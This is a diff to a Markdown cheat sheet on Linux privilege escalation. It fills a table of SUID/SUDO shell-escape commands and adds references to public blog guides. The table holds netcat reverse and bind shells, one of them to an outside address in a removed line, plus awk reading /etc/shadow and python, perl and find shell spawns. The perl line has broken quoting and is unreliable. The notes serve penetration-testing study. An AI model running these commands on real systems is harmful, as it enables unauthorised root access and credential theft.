@@ -35,11 +35,11 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | SUID / SUDO Executables               | Priv Esc Command                                                                    |
 |---------------------------------------|-------------------------------------------------------------------------------------|
 | nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                           |
-| netcat<br>nc                          | nc -e /bin/sh 10.0.0.1 4444  |
-| ncat
+| netcat<br>nc                          | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
+| ncat                                  |                                                                                     |
 | awk <br>gawk                          | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
-| python                                |                                                                                     |
-| perl                                  |                                                                                     |
+| python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
+| perl                                  | perl -e 'exec' "/bin/bash";'                                                                                   |
 | php                                   |      |
 | find                                  | find /home -exec nc -lvp 4444 -e /bin/bash \\;<br> find /home -exec /bin/bash \\;  |
 | xxd                                   |                                                                                     |
@@ -56,3 +56,14 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | bash                                  |                                                                                     |
 | bash                                  |                                                                                     |
 | bash                                  |                                                                                     |
+
+
+
+
+
+## References
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
+https://payatu.com/guide-linux-privilege-escalation/
+
